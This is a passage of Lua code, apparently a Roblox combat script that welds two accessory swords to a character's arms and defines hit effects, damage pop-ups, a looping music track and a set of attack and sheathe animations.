	if hit.Parent:IsA(""Accoutrement"") then
		hit=hit.Parent.Parent:findFirstChild(""Head"")
	end
	if h~=nil and hit.Parent.Name~=Character.Name and hit.Parent:FindFirstChild(""Head"")~=nil then
		if hit.Parent:findFirstChild(""DebounceHit"")~=nil then return end
		Instance.new(""BoolValue"",h.Parent).Name = ""DebounceHit""
        --[[                if game.Players:GetPlayerFromCharacter(hit.Parent)~=nil then
                        return
                end]]
		--                        hs(hit,1.2) 
		local c=Instance.new(""ObjectValue"")
		c.Name=""creator""
		c.Value=game:service(""Players"").LocalPlayer
		c.Parent=h
		game:GetService(""Debris""):AddItem(c,.5)
		local Damage=math.random(minim,maxim)
		--                h:TakeDamage(Damage)
		local  blocked=false
		local  block=hit.Parent:findFirstChild(""Block"")
		if block~=nil then
			print(block.className)
			if block.className==""NumberValue"" then
				if block.Value>0 then
					blocked=true
					if decreaseblock==nil then
						block.Value=block.Value-1
					end
				end
			end
			if block.className==""IntValue"" then
				if block.Value>0 then
					blocked=true
					if decreaseblock~=nil then
						block.Value=block.Value-1
					end
				end
			end
		end
		coroutine.resume(coroutine.create(function()
			h.Parent:BreakJoints()
			coroutine.resume(coroutine.create(function()
				local naeeym2 = Instance.new(""BillboardGui"",h.Parent)
				naeeym2.Size = UDim2.new(0,100,0,40)
				naeeym2.StudsOffset = Vector3.new(0,3,0)
				naeeym2.Adornee = h.Parent.Head
				naeeym2.Name = ""TalkingBillBoard""
				local tecks2 = Instance.new(""TextLabel"",naeeym2)
				tecks2.BackgroundTransparency = 1
				tecks2.BorderSizePixel = 0
				tecks2.Text = ""GIT SKITTL'D!11!""
				tecks2.Font = ""Fantasy""
				tecks2.FontSize = ""Size36""
				tecks2.TextStrokeTransparency = 0
				tecks2.TextColor3 = Color3.new(0,0,0)
				tecks2.TextStrokeColor3 = Color3.new(.6,0,1)
				tecks2.Size = UDim2.new(1,0,0.5,0)
				coroutine.resume(coroutine.create(function()
					while true do
						for i = 0,256,16 do
							tecks2.TextStrokeColor3 = Color3.new(1,i/256,0)
							swait()
						end
						for i = 0,256,16 do
							tecks2.TextStrokeColor3 = Color3.new(1-i/256,1,0)
							swait()
						end
						for i = 0,256,16 do
							tecks2.TextStrokeColor3 = Color3.new(0,1,i/256)
							swait()
						end
						for i = 0,256,16 do
							tecks2.TextStrokeColor3 = Color3.new(0,1-i/256,1)
							swait()
						end
						for i = 0,256,16 do
							tecks2.TextStrokeColor3 = Color3.new(i/256,0,1)
							swait()
						end
						for i = 0,256,16 do
							tecks2.TextStrokeColor3 = Color3.new(1,0,1-i/256)
							swait()
						end
					end
				end))
				swait(50)
				for i = 0,1,.05 do
					swait()
					tecks2.Position = tecks2.Position - UDim2.new(0,0,.005,0)
					tecks2.TextStrokeTransparency = i
					tecks2.TextTransparency = i
				end
				naeeym2:Destroy()
			end))
			local st = (CFrame.new(h.Parent.Head.CFrame * Vector3.new(0,-1.5,0))).p
			for oa = 1, 5 do
				local effp = Instance.new(""Part"",workspace)
				effp.CanCollide = false
				effp.BottomSurface = 0
				effp.TopSurface = 0
				effp.Size = Vector3.new(1,1,1)
				effp.Anchored = true
				effp.CFrame = (h.Parent.Head.CFrame * CFrame.new(0,-1.5,0)) * CFrame.fromEulerAnglesXYZ(math.rad(math.random(0,359)),math.rad(math.random(0,359)),math.rad(math.random(0,359)))
				effp.Material = ""Neon""
				effp.BrickColor = BrickColor.new(""White"")
				local efm = Instance.new(""SpecialMesh"",effp)
				efm.MeshType = ""Sphere""
				coroutine.resume(coroutine.create(function()
					for a = 0,1,.05 do
						efm.Scale = Vector3.new(2-a*2,100*a,2-a*2)
						effp.Transparency = a
						swait()
					end
					effp:Destroy()
				end))
			end
			for i, v in pairs(h.Parent:GetChildren()) do
				if v:IsA(""BasePart"") then
					v.Anchored = false
				end
			end
			for a, v in pairs(h.Parent:GetChildren()) do
				if v:IsA(""BasePart"") then
					local bodpos = Instance.new(""BodyPosition"",v)
					bodpos.Position = v.Position + Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
					v.BrickColor = BrickColor.new(""White"")
					v.Material = ""Neon""
				end
			end
			for d = 0,1,.05 do
				for i, v in pairs(h.Parent:GetChildren()) do
					if v:IsA(""BasePart"") then
						v.Transparency = d
						swait()
					end
				end
			end
			for i, v in pairs(h.Parent:GetChildren()) do
				if v:IsA(""BasePart"") then
					v:Destroy()
				end
			end
		end))
	end
end


function ShowDamage(Dude, Text, Time, Color)
	coroutine.resume(coroutine.create(function()
		local naeeym2 = Instance.new(""BillboardGui"",Dude)
		naeeym2.Size = UDim2.new(0,100,0,40)
		naeeym2.StudsOffset = Vector3.new(0,3,0)
		naeeym2.Adornee = Dude.Head
		naeeym2.Name = ""TalkingBillBoard""
		local tecks2 = Instance.new(""TextLabel"",naeeym2)
		tecks2.BackgroundTransparency = 1
		tecks2.BorderSizePixel = 0
		tecks2.Text = Text
		tecks2.Font = ""Fantasy""
		tecks2.TextSize = 24
		tecks2.TextStrokeTransparency = 0
		tecks2.TextColor3 = Color3.new(.8,0,1)
		tecks2.TextStrokeColor3 = Color3.new(0,0,0)
		tecks2.Size = UDim2.new(1,0,0.5,0)
		swait(10)
		for i = 0,1,.05 do
			swait()
			tecks2.Position = tecks2.Position - UDim2.new(0,0,.005,0)
			tecks2.TextStrokeTransparency = i
			tecks2.TextTransparency = i
		end
		naeeym2:Destroy()
	end))
end

Sword=Character[""VoidLordSword""]
SHandle = Sword.Handle
SHandle.AccessoryWeld:Destroy()
Equipped = false
h = Instance.new(""Attachment"",SHandle)
la = Instance.new(""Attachment"",LeftArm)
gap = Instance.new(""AlignPosition"",SHandle)
gap.Attachment0 = h
gap.Attachment1 = la
gap.RigidityEnabled = true
gao = Instance.new(""AlignOrientation"",SHandle)
gao.Attachment0 = h
gao.Attachment1 = la
gao.RigidityEnabled = true
SHandle:FindFirstChildOfClass(""AlignOrientation"").Attachment1 = LeftArm.LeftGripAttachment
SHandle:FindFirstChildOfClass(""AlignPosition"").Attachment1 = LeftArm.LeftGripAttachment
LeftArm.LeftGripAttachment.Position = Vector3.new(0,-1.3,-3.5)
LeftArm.LeftGripAttachment.Orientation = Vector3.new(330, 180, 0)

Sword1=Character[""Evil Aura""]
SHandle1 = Sword1.Handle
SHandle1.AccessoryWeld:Destroy()
Equipped = false
h1 = Instance.new(""Attachment"",SHandle1)
ra = Instance.new(""Attachment"",RightArm)
gap1 = Instance.new(""AlignPosition"",SHandle1)
gap1.Attachment0 = h1
gap1.Attachment1 = ra
gap.RigidityEnabled = true
gao1 = Instance.new(""AlignOrientation"",SHandle1)
gao1.Attachment0 = h1
gao1.Attachment1 = ra
gao1.RigidityEnabled = true
SHandle1:FindFirstChildOfClass(""AlignOrientation"").Attachment1 = RightArm.RightGripAttachment
SHandle1:FindFirstChildOfClass(""AlignPosition"").Attachment1 = RightArm.RightGripAttachment
RightArm.RightGripAttachment.Position = Vector3.new(0,-1,-2.3)
RightArm.RightGripAttachment.Orientation = Vector3.new(0, 90, 131)

game:GetService(""RunService"").Heartbeat:connect(function()
  SHandle.Velocity = Vector3.new(30,0,0)
  SHandle1.Velocity = Vector3.new(30,0,0)
end)

handle=SHandle
handleweld=weld(handle,Character[""Right Arm""],handle,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-1.00324273, 0.013961792, -0.00828075409, -1.38366803e-013, -0.999999881, 4.25688995e-009, 2.4656245e-007, -4.25688951e-009, -1, 1, -1.373172e-013, 2.4656245e-007))
Hitbox=SHandle
Hitboxweld=weld(m,handle,Hitbox,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.000308990479, -5.48094559, -2.00271606e-005, 1, 6.10120843e-011, -1.08637464e-014, -6.10120843e-011, 1, 7.57154339e-011, 1.08637574e-014, -7.57154339e-011, 1))

handle2=SHandle1
handle2weld=weld(handle2,Character[""Left Arm""],handle2,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-1.00324273, 0.013961792, -0.00828075409, -1.38366803e-013, -0.999999881, 4.25688995e-009, 2.4656245e-007, -4.25688951e-009, -1, 1, -1.373172e-013, 2.4656245e-007))
Hitbox2=SHandle1
Hitbox2weld=weld(m2,handle2,Hitbox2,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.000308990479, -5.48094559, -2.00271606e-005, 1, 6.10120843e-011, -1.08637464e-014, -6.10120843e-011, 1, 7.57154339e-011, 1.08637574e-014, -7.57154339e-011, 1))

local Lite = it(""PointLight"",Torso)
Lite.Color = Color3.new(.7,0,1)
Lite.Range = 8
Lite.Brightness = 10
Lite.Shadows = true

musid = ""rbxassetid://1074563286""
local mus = Instance.new(""Sound"",Character)
mus.Name = ""mus""
mus.SoundId = musid
mus.Looped = true
mus.Volume = 4
mus:Play()

function BreakEffect(brickcolor,cframe,x1,y1,z1)
	local prt=part(""Custom"",effs,""Neon"",0,0,""White"",""Effect"",vt(0.5,0.5,0.5))
	prt.Anchored=true
	prt.CFrame=cframe*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
	local msh=mesh(""SpecialMesh"",prt,""Sphere"","""",vt(0,0,0),vt(x1,y1,z1))
	coroutine.resume(coroutine.create(function(Part,CF,Numbb,randnumb) 
		CF=Part.CFrame
		Numbb=0
		randnumb=math.random()-math.random()
		for i=0,1,0.05 do
			swait()
			CF=CF*cf(0,1,0)
			--Part.CFrame=Part.CFrame*euler(0.5,0,0)*cf(0,1,0)
			Part.CFrame=CF*euler(Numbb,0,0)
			Part.Transparency=i
			Numbb=Numbb+randnumb
		end
		Part.Parent=nil
	end),prt)
end
--BreakEffect(BrickColor.new(""New Yeller""),Hitbox.CFrame,0.5,math.random(5,20),0.5)

neons = {}
for i, v in pairs(Character:GetDescendants()) do
	if v:IsA(""BasePart"") and (v.Parent == m or v.Parent == m2) and v.BrickColor == BrickColor.new(""White"") then
		table.insert(neons,v)
		v.Material = ""Neon""
	end
end


colrr = Color3.new()
maincol = Color3.new()

function attackone()
	attack=true
	for i=0,1,0.1 do
		swait()
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(120),math.rad(0),math.rad(20)),.3)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(-20),math.rad(-90)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-50),math.rad(-5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(120),math.rad(-10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(0,-0,.4)*angles(math.rad(70),math.rad(-10),math.rad(0)),.3)
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-70)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(50)),.3)
		handle2weld.C0=clerp(handle2weld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
	end
	for i=0,1,0.1 do
		swait()
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(110),math.rad(-90),math.rad(20)),.3)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(-20),math.rad(-50)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-120),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(0,-0,0)*angles(math.rad(-60),math.rad(-10),math.rad(0)),.3)
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(90)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(-50)),.3)
		handle2weld.C0=clerp(handle2weld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
	end
	attack=false
	scfr = nil
	--tr1.Enabled = false
end

function attacktwo()
	attack=true
	for i=0,1,0.1 do
		swait()
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(90),math.rad(90)),.3)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(-20),math.rad(-50)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-130),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(0,-0,0)*angles(math.rad(-30),math.rad(-10),math.rad(0)),.3)
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(70)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(-50)),.3)
	end
	for i=0,1,0.1 do
		swait()
		--local blcf = Hitbox.CFrame*CFrame.new(0,.3,0)
		--if scfr and (Hitbox.Position-scfr.p).magnitude > .1 then
		--local h = 5
		--local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
		--if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
		--local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
		--if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
		--scfr = blcf
		--elseif not scfr then
		--scfr = blcf
		--end
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(-50),math.rad(90)),.3)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(-20),math.rad(-90)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-50),math.rad(-5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(130),math.rad(-10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(0,-0,0)*angles(math.rad(-50),math.rad(10),math.rad(0)),.3)
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-70)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(50)),.3)
	end
	attack=false
	scfr = nil
end

function attack2one()
	attack=true
	for i=0,1,0.1 do
		swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(70)),.3)
		RW.C0 = clerp(RW.C0,CFrame.new(1.40839815, 0.633968949, 0.140340954, 0.766044259, -0.642787933, 7.74860382e-07, 0.492404878, 0.586824119, -0.64278686, 0.413175166, 0.492403537, 0.766045213),0.3)
		LW.C0 = clerp(LW.C0,CFrame.new(-1.35310566, 0.284592211, 0.109513491, 0.178405479, 0.982817411, 0.0473444164, 0.969994664, -0.167593122, -0.176132992, -0.165171936, 0.0773468912, -0.983227134),0.3)
		handle2weld.C0 = clerp(handle2weld.C0,CFrame.new(-0.511685491, -0.327819645, -0.209367245, 0.754512787, -0.544126034, 0.366929621, 0.564744711, 0.823128462, 0.0593538433, -0.334326208, 0.162438288, 0.92835319),0.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-130),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(-50)),.3)
	end
	for i=0,1,0.1 do
		swait()
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-130),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RW.C0 = clerp(RW.C0,CFrame.new(1.40839434, 0.633969903, 0.140334338, 0.766044557, -0.642787576, 1.93715096e-06, 0.492405057, 0.586823642, -0.642787158, 0.41317451, 0.49240455, 0.766044974),0.3)
		LW.C0 = clerp(LW.C0,CFrame.new(-1.31502986, 0.279656291, -0.555327773, 0.691364348, -0.713763416, 0.11205925, 0.35895291, 0.204722002, -0.910627127, 0.627031207, 0.669799149, 0.397744954),0.3)
		handle2weld.C0 = clerp(handle2weld.C0,CFrame.new(-0.425278902, -0.679693937, -0.729468644, 0.728087127, -0.518560231, 0.448312759, -0.252376348, 0.405284405, 0.878664255, -0.637334585, -0.752887487, 0.164210081),0.3)
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-70)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(50)),.3)
	end
	attack=false
	scfr = nil
	--tr2.Enabled = false
end

function Stab()
	attack=true
	for i=0,1,0.05 do
		swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(-50),math.rad(0),math.rad(0)),.1)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
		RW.C0=clerp(RW.C0,cf(1.2,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(90)),.1)
		LW.C0=clerp(LW.C0,cf(-1.2,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(-90)),.1)
		LH.C0=clerp(LH.C0,cf(-1,-.9,0)*angles(math.rad(-50),math.rad(-60),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-.9,0)*angles(math.rad(-50),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(0,-1,1)*angles(math.rad(-270),math.rad(180),math.rad(0)),.4)
		handle2weld.C0=clerp(handleweld.C0,cf(0,-1,1)*angles(math.rad(-270),math.rad(180),math.rad(0)),.4)
	end
	for i=0,1,0.1 do
		swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.4)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.4)
		RW.C0=clerp(RW.C0,cf(1.2,0.5,0)*angles(math.rad(20),math.rad(100),math.rad(90)),.3)
		LW.C0=clerp(LW.C0,cf(-1.2,0.5,0)*angles(math.rad(20),math.rad(-100),math.rad(-90)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-.9,0)*angles(math.rad(0),math.rad(-60),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-.9,0)*angles(math.rad(40),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(0,-1,1)*angles(math.rad(-270),math.rad(180),math.rad(0)),.4)
		handle2weld.C0=clerp(handleweld.C0,cf(0,-1,1)*angles(math.rad(-270),math.rad(180),math.rad(0)),.4)
	end
	swait(5)
	swait(20)
	attack=false
	scfr = nil
end

function Spin()
	attack=true
	for i=0,1,1 do
		swait()
		for i=0,1,0.1 do
			swait()
			RW.C0=clerp(RW.C0,cf(1,0.5,-.5)*angles(math.rad(90),math.rad(0),math.rad(0)),.3)
			LW.C0=clerp(LW.C0,cf(-1,0.5,-.5)*angles(math.rad(90),math.rad(0),math.rad(0)),.3)
			LH.C0=clerp(LH.C0,cf(-1,-.5,-1)*angles(math.rad(-20),math.rad(-90),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-.5,-1)*angles(math.rad(-20),math.rad(90),math.rad(0)),.3)
			RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,5)*euler(6*i,0,0),.5)
			handleweld.C0=clerp(handleweld.C0,cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),1)
			handle2weld.C0=clerp(handle2weld.C0,cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),1)
		end
	end
	attack=false
	scfr = nil
	--tr1.Enabled = false
	--tr2.Enabled = false
end

function ContAttack()
	attack=true
	
	for i=1,4 do
		swait()
		for i=0,1,0.2 do
			swait()
			RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(120),math.rad(0),math.rad(20)),.3)
			LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(-20),math.rad(-90)),.3)
			LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-50),math.rad(-5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(120),math.rad(-10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			handleweld.C0=clerp(handleweld.C0,cf(0,-0,.4)*angles(math.rad(70),math.rad(-10),math.rad(0)),.3)
			RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-70)),.3)
			Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(50)),.3)
		end
		for i=0,1,0.2 do
			swait()
			
			RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(110),math.rad(-90),math.rad(20)),.3)
			LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(-20),math.rad(-50)),.3)
			LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-120),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			handleweld.C0=clerp(handleweld.C0,cf(0,-0,0)*angles(math.rad(-60),math.rad(-10),math.rad(0)),.3)
			RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(90)),.3)
			Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(-50)),.3)
		end
		for i=0,1,0.2 do
			swait()
			RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(90),math.rad(90)),.3)
			LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(-20),math.rad(-50)),.3)
			LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-130),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			handleweld.C0=clerp(handleweld.C0,cf(0,-0,0)*angles(math.rad(-30),math.rad(-10),math.rad(0)),.3)
			RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(70)),.3)
			Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(-50)),.3)
		end
		for i=0,1,0.2 do
			swait()
			RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(70)),.3)
			RW.C0 = clerp(RW.C0,CFrame.new(1.40839815, 0.633968949, 0.140340954, 0.766044259, -0.642787933, 7.74860382e-07, 0.492404878, 0.586824119, -0.64278686, 0.413175166, 0.492403537, 0.766045213),0.3)
			LW.C0 = clerp(LW.C0,CFrame.new(-1.35310566, 0.284592211, 0.109513491, 0.178405479, 0.982817411, 0.0473444164, 0.969994664, -0.167593122, -0.176132992, -0.165171936, 0.0773468912, -0.983227134),0.3)
			handle2weld.C0 = clerp(handle2weld.C0,CFrame.new(-0.511685491, -0.327819645, -0.209367245, 0.754512787, -0.544126034, 0.366929621, 0.564744711, 0.823128462, 0.0593538433, -0.334326208, 0.162438288, 0.92835319),0.3)
			LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-130),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(-50)),.3)
		end
		for i=0,1,0.2 do
			swait()
			LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-130),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			RW.C0 = clerp(RW.C0,CFrame.new(1.40839434, 0.633969903, 0.140334338, 0.766044557, -0.642787576, 1.93715096e-06, 0.492405057, 0.586823642, -0.642787158, 0.41317451, 0.49240455, 0.766044974),0.3)
			LW.C0 = clerp(LW.C0,CFrame.new(-1.31502986, 0.279656291, -0.555327773, 0.691364348, -0.713763416, 0.11205925, 0.35895291, 0.204722002, -0.910627127, 0.627031207, 0.669799149, 0.397744954),0.3)
			handle2weld.C0 = clerp(handle2weld.C0,CFrame.new(-0.425278902, -0.679693937, -0.729468644, 0.728087127, -0.518560231, 0.448312759, -0.252376348, 0.405284405, 0.878664255, -0.637334585, -0.752887487, 0.164210081),0.3)
			RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-70)),.3)
			Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(50)),.3)
		end
	end
	attack=false
	scfr = nil
	--tr1.Enabled = false
	--tr2.Enabled = false
end


function Sheathe()
	attack = true
	CurrentMode = ""Sheathed""
	for i = 0,1,0.1 do
		swait()
		handleweld.Part0 = Torso
		handle2weld.Part0 = Torso
		SHandle:FindFirstChildOfClass(""AlignOrientation"").Attachment1 = Torso.BodyFrontAttachment
		SHandle:FindFirstChildOfClass(""AlignPosition"").Attachment1 = Torso.BodyFrontAttachment
		Torso.BodyFrontAttachment.Orientation = Vector3.new(0,0,90)
		Torso.BodyFrontAttachment.Position = Vector3.new(0,0,.5)
		SHandle1:FindFirstChildOfClass(""AlignOrientation"").Attachment1 = Torso.BodyBackAttachment
		SHandle1:FindFirstChildOfClass(""AlignPosition"").Attachment1 = Torso.BodyBackAttachment
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(-20)),.3)
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(190),math.rad(0),math.rad(0)),.3)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-190),math.rad(0),math.rad(-0)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-60),math.rad(-5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(-10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(3,3,0.5)*angles(math.rad(90),math.rad(150),math.rad(90)),.3)
		handle2weld.C0=clerp(handle2weld.C0,cf(-3,3,0.5)*angles(math.rad(90),math.rad(-150),math.rad(-90)),.3)
	end
	attack = false
end

function Unsheathe()
	attack = true
	CurrentMode = ""Unsheathed""
	for i = 0,1,0.1 do
		swait()
		handleweld.Part0 = RightArm
		handle2weld.Part0 = LeftArm
		SHandle:FindFirstChildOfClass(""AlignOrientation"").Attachment1 = LeftArm.LeftGripAttachment
		SHandle:FindFirstChildOfClass(""AlignPosition"").Attachment1 = LeftArm.LeftGripAttachment
		LeftArm.LeftGripAttachment.Position = Vector3.new(0,-1,-2.3)
		LeftArm.LeftGripAttachment.Orientation = Vector3.new(0, 90, 140)
		SHandle1:FindFirstChildOfClass(""AlignOrientation"").Attachment1 = RightArm.RightGripAttachment
		SHandle1:FindFirstChildOfClass(""AlignPosition"").Attachment1 = RightArm.RightGripAttachment
		RightArm.RightGripAttachment.Position = Vector3.new(0,-1,-2.3)
